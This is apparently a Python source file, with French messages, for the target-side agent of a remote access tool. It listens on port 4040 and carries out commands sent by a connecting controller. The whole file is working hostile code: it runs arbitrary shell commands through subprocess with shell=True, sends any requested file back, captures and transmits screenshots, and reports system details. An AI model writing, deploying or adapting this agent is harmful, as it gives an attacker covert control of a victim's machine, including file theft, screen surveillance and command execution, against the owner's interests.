import subprocess
import os
import platform
from PIL import ImageGrab

from base import *
from commande_spliter import commande_spliter

ENCODING = 'utf-8'


class TargetSocket(BaseSocket):

    PORT = 4040
    IP = socket.gethostname()

    def __init__(self, ip: str = IP, port: int = PORT):
        super().__init__()
        self.sock: socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, socket.SOCK_STREAM)
        self.sock.bind((ip, port))
        self.clientaddress = (None, None)

    def listen(self):
        self.sock.listen()
        print('📡 Attente de connexion sur ' + colored_info(f'{self.IP}:{self.PORT} 📡'))
        self.clientsocket, self.clientaddress = self.sock.accept()
        print(colored_success('✅ Connectee avec ') +
              colored_info(f'{self.clientaddress[0]}:{self.clientaddress[1]} ✅\n'))
        self.connected = True

    def run(self):
        while True:
            commande = self.recv_header_data().decode(encoding=ENCODING)
            splited_commande = commande_spliter(commande)

            if not commande:
                break

            elif commande.lower() == 'exit':
                break

            elif commande.lower() == 'os':
                result = platform.platform() + '\n'

            elif commande.lower() == 'info':
                result = os.getcwd()

            elif splited_commande[0] == 'cd':
                try:
                    os.chdir(splited_commande[1])
                    result = os.getcwd() + '\n'
                except FileNotFoundError as err:
                    result = colored_error(str(err))
                    print(result)

            elif splited_commande[0] == 'dl':
                try:
                    with open(splited_commande[1], 'rb') as f:
                        result = f.read()
                except FileNotFoundError as err:
                    print(str(err))
                    result = 'filenotfound'
                except IsADirectoryError as err:
                    print(str(err))
                    result = 'isdir'

            elif splited_commande[0] == 'capture':
                try:
                    image = ImageGrab.grab()
                    image.save(splited_commande[1], 'png')
                    with open(splited_commande[1], 'rb') as img:
                        result = img.read()
                except OSError as err:
                    print(str(err))
                    result = 'screenshot-error'

            else:
                output = subprocess.run(commande, shell=True, universal_newlines=True, capture_output=True)
                if output.stdout is None:
                    result = colored_error(f'❗ Erreur!')
                elif output.stdout == '':
                    result = colored_error(output.stderr)
                else:
                    result = output.stdout

            if commande.lower() != 'info':
                print(f'{CYAN} ⌨️   > {commande}')

            if not result:
                self.send_header_data(colored_error(f'❗ Erreur!').encode())
            else:
                if isinstance(result, str):
                    result = result.encode(encoding=ENCODING)
                self.send_header_data(result)

        print(colored_success(f'\n‼️ Deconnecte\n'))
        self.clientsocket.close()
        self.sock.close()


if __name__ == '__main__':
    target = TargetSocket()
    target.listen()
    target.run()
